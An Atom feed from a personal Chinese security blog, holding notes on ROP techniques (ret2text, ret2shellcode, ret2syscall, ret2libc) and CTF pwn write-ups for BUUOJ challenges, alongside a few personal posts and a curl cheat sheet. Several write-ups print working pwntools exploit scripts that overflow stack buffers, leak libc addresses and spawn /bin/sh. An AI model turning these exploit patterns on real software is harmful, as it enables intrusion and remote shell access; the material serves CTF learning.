<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>8023</title>
  
  <subtitle>可是我啊文采黯然，写不出漂亮的话，只能通俗了事地叙述着心中憾事</subtitle>
  <link href="https://pr0b1em.github.io/atom.xml" rel="self"/>
  
  <link href="https://pr0b1em.github.io/"/>
  <updated>2021-06-20T14:05:47.967Z</updated>
  <id>https://pr0b1em.github.io/</id>
  
  <author>
    <name>Pr0b1em</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>基本ROP</title>
    <link href="https://pr0b1em.github.io/2021/06/20/%E5%9F%BA%E6%9C%ACROP/"/>
    <id>https://pr0b1em.github.io/2021/06/20/%E5%9F%BA%E6%9C%ACROP/</id>
    <published>2021-06-20T13:55:52.000Z</published>
    <updated>2021-06-20T14:05:47.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><pre><code>程序存在溢出，并且可以控制返回地址。可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</code></pre><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p><p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>]]></content>
    
    
    <summary type="html">ROP小分类</summary>
    
    
    
    <category term="笔记" scheme="https://pr0b1em.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>(OGeek2019)babyrop(ret2libc)</title>
    <link href="https://pr0b1em.github.io/2021/06/20/[OGeek2019]babyrop/"/>
    <id>https://pr0b1em.github.io/2021/06/20/[OGeek2019]babyrop/</id>
    <published>2021-06-20T13:17:26.000Z</published>
    <updated>2021-06-20T13:18:28.260Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="OGeek2019-babyrop-ret2libc"><a href="#OGeek2019-babyrop-ret2libc" class="headerlink" title="[OGeek2019]babyrop(ret2libc)"></a>[OGeek2019]babyrop(ret2libc)</h1><p>查壳，32位，开了NX</p><p><img src="/img/image-20210504170711043.png" alt="image-20210504170711043"></p><p>IDA打开查看发现有随机数问题</p><p><img src="/img/image-20210504171507650.png" alt="image-20210504171507650"></p><p>通过strncmp函数比较随机数与输入数是否相等</p><p><img src="/img/image-20210504171816124.png" alt="image-20210504171816124"></p><p>这里想到可以通过\x00来绕过strncmp函数，因为strlen遇到\x00会停止</p><p><img src="/img/image-20210504181922297.png" alt="image-20210504181922297"></p><p>因为a1是函数sub_804871F的返回值，那就让a1为 \xff 这样就可以进行栈溢出了 </p><p><img src="/img/image-20210513155325475.png" alt="image-20210513155325475"></p><p>libc.so可以给我们提供一套函数的地址，并且在里面虽有函数的相对位置都是固定的。意思是如果我们知道了每一个函数的真实地址，我们可以根据给出的libc.so计算出其他函数的真实地址(实际上就是要得到system_addr)</p><p>这里选择泄露write_addr，然后计算出system_addr</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28990&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>) * <span class="string">b&#x27;a&#x27;</span> +  p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct\n&quot;</span>,payload)</span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>).strip().ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;write_addr: &#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr   &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;binsh_addr   &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">7</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload = (<span class="number">0xE7</span> + <span class="number">4</span>)  * <span class="string">b&#x27;a&#x27;</span> +  p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr) </span><br><span class="line">io.sendlineafter(<span class="string">&quot;Correct&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>最后脚本一跑，拿到了flag</p><p><img src="/img/image-20210620200813979.png" alt="image-20210620200813979"></p>]]></content>
    
    
    <summary type="html">简单的ret2libc</summary>
    
    
    
    <category term="writeup" scheme="https://pr0b1em.github.io/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>(HarekazeCTF2019)baby_rop(ret2text)</title>
    <link href="https://pr0b1em.github.io/2021/06/20/[HarekazeCTF2019]baby_rop/"/>
    <id>https://pr0b1em.github.io/2021/06/20/[HarekazeCTF2019]baby_rop/</id>
    <published>2021-06-20T13:17:26.000Z</published>
    <updated>2021-06-20T13:18:29.721Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="HarekazeCTF2019-baby-rop-ret2text"><a href="#HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="[HarekazeCTF2019]baby_rop(ret2text)"></a>[HarekazeCTF2019]baby_rop(ret2text)</h2><p>先查壳，开了NX，64位</p><p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p><p>IDA打开，F5查看main函数</p><p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p><p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p><p>看见system函数</p><p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p><p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p><p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p><p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p><p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">io</span> = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28379&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x601048</span></span><br><span class="line">system_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;your name?&#x27;</span>)</span><br><span class="line">payload = <span class="number">0x18</span> * b<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="built_in">io</span>.sendline(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure><p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p><p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>]]></content>
    
    
    <summary type="html">简单的ret2text</summary>
    
    
    
    <category term="writeup" scheme="https://pr0b1em.github.io/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2text</title>
    <link href="https://pr0b1em.github.io/2021/06/20/ret2text/"/>
    <id>https://pr0b1em.github.io/2021/06/20/ret2text/</id>
    <published>2021-06-20T09:28:46.000Z</published>
    <updated>2021-06-20T12:54:23.734Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码 (.text),使EIP指向具有system(“/bin/sh”)的代码段。</p><h2 id="例题：-HarekazeCTF2019-baby-rop-ret2text"><a href="#例题：-HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="例题： [HarekazeCTF2019]baby_rop(ret2text)"></a>例题： [HarekazeCTF2019]baby_rop(ret2text)</h2><p>先查壳，开了NX，64位</p><p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p><p>IDA打开，F5查看main函数</p><p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p><p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p><p>看见system函数</p><p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p><p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p><p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p><p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p><p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">io</span> = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28379&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x601048</span></span><br><span class="line">system_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;your name?&#x27;</span>)</span><br><span class="line">payload = <span class="number">0x18</span> * b<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="built_in">io</span>.sendline(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure><p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p><p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p><p>这是属于最简单的例题，稍微难一点的会涉及到计算地址偏移量。</p>]]></content>
    
    
    <summary type="html">ret2text类型题目解法</summary>
    
    
    
    <category term="笔记" scheme="https://pr0b1em.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2libc</title>
    <link href="https://pr0b1em.github.io/2021/06/20/ret2libc/"/>
    <id>https://pr0b1em.github.io/2021/06/20/ret2libc/</id>
    <published>2021-06-20T07:26:12.000Z</published>
    <updated>2021-06-20T13:47:34.431Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>libc是Linux下的ANSIC的函数库。</p><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><h3 id="非执行堆栈"><a href="#非执行堆栈" class="headerlink" title="非执行堆栈"></a>非执行堆栈</h3><p>非执行堆栈是为避免堆或者堆栈的内存区域被植入恶意代码执行，当然也可以直接防止一部分内存被写入恶意代码。换句话说，这是个防止缓冲区溢出的功能。</p><p>当checksec发现NX(No-eXecute)开启后，其实就已经是非执行堆栈了，这时候就需要用到libc库。</p><h5 id="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"><a href="#libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖" class="headerlink" title="libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖"></a>libc是怎么来的：不再用指令覆盖EIP，直接调用libc库中我们需要的函数覆盖</h5><p>思路：</p><p>1.泄露 一个调用函数的 地址</p><p>2.获取 libc 版本</p><p>3.获取 system 地址与 /bin/sh 的地址</p><p>4.再次执行源程序</p><p>5.触发栈溢出执行 system(‘/bin/sh’)</p><p>shellcode结构：</p><p><img src="/img/shellcode.png"></p><p>正常堆栈布局：</p><p><img src="/img/1.png"></p><p>ret2libc执行system的堆栈布局：</p><p><img src="/img/2.png"></p><p>具体例题可以查看[OGeek2019]babyrop的writeup。</p><p>平常的shellcode在源程序里就能找到system函数和/bin/sh，而ret2libc类型的题差别就在这里，我们需要通过libc库查找到system函数和/bin/sh在源程序中的位置，然后才能构造shellcode进行夺权，最后拿下flag。</p>]]></content>
    
    
    <summary type="html">ret2libc类型题目解法</summary>
    
    
    
    <category term="笔记" scheme="https://pr0b1em.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>blog诞生日2021.6.17</title>
    <link href="https://pr0b1em.github.io/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/"/>
    <id>https://pr0b1em.github.io/2021/06/17/blog%E8%AF%9E%E7%94%9F%E6%97%A52021-6-17/</id>
    <published>2021-06-17T10:17:26.000Z</published>
    <updated>2021-06-18T03:16:37.048Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>经过一下午不懈的努力，我终于在2021年6月17日下午17：30成功搭建了我的博客，在这发文纪念一下！<br><img src="/img/%E8%AF%9E%E7%94%9F%E6%97%A5.jpg"></p>]]></content>
    
    
    <summary type="html">博客诞生日！</summary>
    
    
    
    <category term="日常闲话" scheme="https://pr0b1em.github.io/categories/%E6%97%A5%E5%B8%B8%E9%97%B2%E8%AF%9D/"/>
    
    
  </entry>
  
  <entry>
    <title>get_started_3dsctf_2016</title>
    <link href="https://pr0b1em.github.io/2021/06/17/get_started_3dsctf_2016/"/>
    <id>https://pr0b1em.github.io/2021/06/17/get_started_3dsctf_2016/</id>
    <published>2021-06-17T10:17:26.000Z</published>
    <updated>2021-06-18T03:17:06.067Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>先查壳，32位，开了NX</p><p><img src="/img/image-20210425011728468.png"></p><p>IDA打开，main函数上的get_flag函数里发现一个flag.txt</p><p><img src="/img/image-20210425011933854.png"></p><p>继续跟进发现当满足一个条件时，可以打开flag.txt，即为a1 == 814536271 &amp;&amp; a2 == 425138641时</p><p><img src="/img/image-20210425012146370.png"></p><p>点击a1查看到了在栈中的位置</p><p><img src="/img/image-20210425012353464.png"></p><p>但是这两个位置在返回地址之后，无法利用溢出覆盖来实现控制</p><p>只有继续看，tab+空格跳转之后发现了有关flag.txt的设置地址</p><p><img src="/img/image-20210425012826978.png"></p><p>从0x80489B8的位置开始才能打开flag.txt，于是想办法跳转到这儿</p><p><img src="/img/image-20210425013007535.png"></p><p>在main函数中发现可以利用gets函数溢出，覆盖返回地址，实现控制</p><p><img src="/img/image-20210425013149728.png"></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;node3.buuoj.cn&quot; , 26419)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(<span class="number">0x80489B8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>但是没办法得到flag，这里还发现这样远程是无法连接的</p><p>看了网上的wp有大佬说需要维护栈，由于远端服务器中gets函数没有正常退出，它程序会崩溃，就无法获取到flag ，此时使用exit函数使gets函数强制退出，那么就能获得flag了，于是我又修改了exp，找到exit函数的位置,这时候也不需要再考虑a1、a2位置在返回地址后了，可以完全根据get_flag函数的要求来，传两个满足条件的数上去，然后顺理成章打开flag.txt得到flag</p><p><img src="/img/image-20210425162841539.png"></p><h3 id="exp2（强制退出）"><a href="#exp2（强制退出）" class="headerlink" title="exp2（强制退出）"></a>exp2（强制退出）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26419</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">get_addr = <span class="number">0x080489A0</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line"></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(get_addr) + p32(exit_addr)</span><br><span class="line">payload += p32(a1) + p32(a2)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="/img/image-20210425165227769.png"></p><p>虽然这种方法应该不是最正确的做法，但我觉得这方法挺聪明，正规的做法需要通过mprotect函数修改bss段的权限，然后传入shellcode，但我能力有限，暂时还不会</p>]]></content>
    
    
    <summary type="html">未完待续......</summary>
    
    
    
    <category term="writeup" scheme="https://pr0b1em.github.io/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>飞蓬大将军</title>
    <link href="https://pr0b1em.github.io/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/"/>
    <id>https://pr0b1em.github.io/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</id>
    <published>2021-06-17T10:17:26.000Z</published>
    <updated>2021-06-18T03:17:17.524Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p><p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>]]></content>
    
    
    <summary type="html">永远的仙剑</summary>
    
    
    
    <category term="日常闲话" scheme="https://pr0b1em.github.io/categories/%E6%97%A5%E5%B8%B8%E9%97%B2%E8%AF%9D/"/>
    
    
  </entry>
  
  <entry>
    <title>CURL</title>
    <link href="https://pr0b1em.github.io/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/"/>
    <id>https://pr0b1em.github.io/2021/06/17/curl%E5%91%BD%E4%BB%A4%EF%BC%88http%E8%AF%B7%E6%B1%82%EF%BC%89/</id>
    <published>2021-06-17T10:17:26.000Z</published>
    <updated>2021-06-18T03:16:53.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="curl-命令"><a href="#curl-命令" class="headerlink" title="curl 命令"></a>curl 命令</h1><span id="more"></span><p>curl 命令在 Linux 操作系统中经常来测试网络和 url 的联通性，模拟正常的网络访问。除此之外，curl<br>还支持包括 HTTP、HTTPS、ftp 等众多协议，还支持 POST、cookies、认证、从指定偏移处下载部分文<br>件等功能<br>1.curl url(获取网址的文本信息)<br>2.curl -i url(获取文本的头部及文本信息)<br>3.curl -x proxy url(使用代理请求网页内容)<br>4.curl -v(获取整个通信过程)<br>5.curl -X url(使用特定方法请求网页文本)<br>6.curl -I url(仅返回头部信息)</p>]]></content>
    
    
    <summary type="html">curl常用方法</summary>
    
    
    
    <category term="笔记" scheme="https://pr0b1em.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
